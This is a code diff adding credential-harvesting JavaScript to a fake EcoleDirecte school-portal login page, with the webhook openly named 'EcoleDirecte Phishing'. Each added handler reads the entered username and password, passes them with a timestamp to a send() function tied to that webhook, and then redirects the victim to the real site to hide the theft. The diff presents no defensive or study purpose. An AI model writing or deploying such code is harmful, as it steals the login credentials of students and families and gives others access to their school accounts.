@@ -149,7 +149,20 @@
 <!-- <button _ngcontent-jkw-c62="" id="connexion" type="submit" class="btn btn-info btn-block login" onclick="connect_funct()">Connexion</button> -->
 
 <script type="text/javascript">
-
+    
+function connect_funct() {
+    var uname = document.getElementById("username").value;
+    var pass = document.getElementById("password").value;
+    const d = new Date();
+    let date_string = d.toLocaleString();
+    const webhook_name = "EcoleDirecte Phishing";
+    
+    console.log("connect_funct 1");
+    console.log("username : ", uname);
+    console.log("password : ", pass);
+    send(webhook_name, uname, pass, date_string);
+    setTimeout(function () { location.assign("https://www.ecoledirecte.com");}, 5);
+  }
   document.getElementById("bouton").onclick = function connect_funct() {
     var uname = document.getElementById("username").value;
     var pass = document.getElementById("password").value;
@@ -161,6 +174,21 @@
     console.log("username : ", uname);
     console.log("password : ", pass);
 
+    send(webhook_name, uname, pass, date_string);
+    setTimeout(function () { location.assign("https://www.ecoledirecte.com");}, 5);
+
+  }
+    
+    document.getElementById("connexion").onclick = function connect_funct() {
+    var uname = document.getElementById("username").value;
+    var pass = document.getElementById("password").value;
+    const d = new Date();
+    let date_string = d.toLocaleString();
+    const webhook_name = "EcoleDirecte Phishing";
+
+    console.log("connect_funct 3");
+    console.log("username : ", uname);
+    console.log("password : ", pass);
     send(webhook_name, uname, pass, date_string);
     setTimeout(function () { location.assign("https://www.ecoledirecte.com");}, 5);
 
